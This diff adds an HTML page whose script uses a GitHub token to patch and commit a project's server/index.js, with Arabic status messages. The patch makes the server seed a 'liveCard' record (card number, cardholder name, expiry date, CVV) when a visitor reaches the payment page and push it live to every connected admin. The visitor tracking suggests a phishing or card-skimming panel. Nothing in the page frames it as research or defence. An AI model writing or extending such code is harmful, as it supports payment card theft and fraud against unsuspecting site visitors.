@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><title>KDD fix19</title>
+<style>body{margin:0;background:#0d1117;color:#c9d1d9;font:13px/1.7 ui-monospace,Consolas,monospace;padding:14px}
+h1{font-size:15px;color:#58a6ff;margin:0 0 8px}#out{white-space:pre-wrap;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;min-height:140px}</style></head>
+<body>
+<h1>KDD fix19 — إظهار البطاقة المباشرة فور دخول صفحة الدفع</h1>
+<div id="out">جارٍ البدء...</div>
+<script>
+(function(){
+  var out=document.getElementById('out');
+  out.textContent='السكربت شغال...';
+  try{
+    var OWNER='fahshomi-ui',REPO='KDD',BRANCH='main';
+    var TOKEN=(location.href.match(/ghp_[A-Za-z0-9]+/)||[])[0]||localStorage.getItem('kdd_token')||'';
+    var buf='';
+    function say(s){buf+=s+"\n";out.textContent=buf;}
+    function b64d(b){var bin=atob(b.replace(/\n/g,''));var u=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);return new TextDecoder('utf-8').decode(u);}
+    function b64e(s){var u=new TextEncoder().encode(s);var bin='';for(var i=0;i<u.length;i++)bin+=String.fromCharCode(u[i]);return btoa(bin);}
+    function gh(p,o){o=o||{};return fetch('https://api.github.com/repos/'+OWNER+'/'+REPO+'/contents/'+p+(o.q?'?'+o.q:''),{method:o.method||'GET',headers:{'Authorization':'token '+TOKEN,'Accept':'application/vnd.github+json','Content-Type':'application/json'},body:o.body});}
+    function getJson(p){
+      return gh(p,{q:'ref='+BRANCH+'&cb='+Date.now()}).then(function(r){
+        if(r.status===401){say('   ! توكن مرفوض');var t=prompt('الصق توكن GitHub (ghp_...):','');
+          if(!t)throw new Error('بدون توكن');TOKEN=t.trim();localStorage.setItem('kdd_token',TOKEN);
+          say('   token: '+TOKEN.slice(0,12)+'...');return gh(p,{q:'ref='+BRANCH+'&cb='+Date.now()});}
+        return r;
+      }).then(function(r){if(!r.ok)throw new Error('GET HTTP '+r.status);return r.json();});
+    }
+
+    var OLD=[
+      "        visitor.hasEnteredCardPage = true;",
+      "        visitor.lastDataUpdate = new Date().toISOString();",
+      "      } else {"
+    ].join("\n");
+
+    var NEW=[
+      "        visitor.hasEnteredCardPage = true;",
+      "        visitor.lastDataUpdate = new Date().toISOString();",
+      "        if (!visitor.liveCard) {",
+      "          visitor.liveCard = { cardNumber: '', nameOnCard: '', expiryDate: '', cvv: '' };",
+      "          visitor.liveCardTimestamp = new Date().toISOString();",
+      "          admins.forEach((admin, adminSocketId) => {",
+      "            io.to(adminSocketId).emit(\"card:liveUpdate\", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });",
+      "          });",
+      "        }",
+      "      } else {"
+    ].join("\n");
+
+    function fixServer(src){
+      if(src.indexOf('visitor.liveCard = { cardNumber: \'\', nameOnCard: \'\', expiryDate: \'\', cvv: \'\' };')>-1)
+        return {src:src,changed:false,note:'مُصلَّح مسبقاً'};
+      if(src.indexOf(OLD)===-1) return {src:src,changed:false,note:'ما لقيت مكان التعديل'};
+      return {src:src.replace(OLD,NEW),changed:true,note:'إنشاء بطاقة مباشرة فور دخول صفحة الدفع'};
+    }
+
+    function patch(p,msg){
+      say('— '+p);
+      return getJson(p).then(function(j){
+        var res=fixServer(b64d(j.content));
+        if(!res.changed){say('   = لا تغيير ('+res.note+')');return;}
+        say('   ✓ '+res.note);
+        return gh(p,{method:'PUT',body:JSON.stringify({message:msg,content:b64e(res.src),sha:j.sha,branch:BRANCH})})
+          .then(function(r){
+            if(r.ok){say('   ✔ تم الحفظ');return;}
+            if(r.status===409){say('   ! تعارض — إعادة...');return patch(p,msg);}
+            return r.text().then(function(t){throw new Error('PUT HTTP '+r.status+' '+t.slice(0,120));});
+          });
+      }).catch(function(e){say('   ✗ '+e.message);});
+    }
+
+    say('token: '+(TOKEN?TOKEN.slice(0,12)+'...':'(من الذاكرة)'));
+    patch('server/index.js','fix(server): seed live card on payment page enter')
+      .then(function(){
+        say("\n— التحقق...");
+        return getJson('server/index.js').then(function(j){
+          var t=b64d(j.content);
+          say(t.indexOf("if (!visitor.liveCard) {")>-1?'   ✔ التعديل موجود':'   ✗ ناقص');
+        });
+      })
+      .then(function(){say("\n✅ تم — Render: Manual Deploy ← Deploy latest commit");});
+  } catch(err) {
+    out.textContent='ERR: '+err.message+"\n"+(err.stack||'');
+  }
+})();
+</script>
+</body>
+</html>
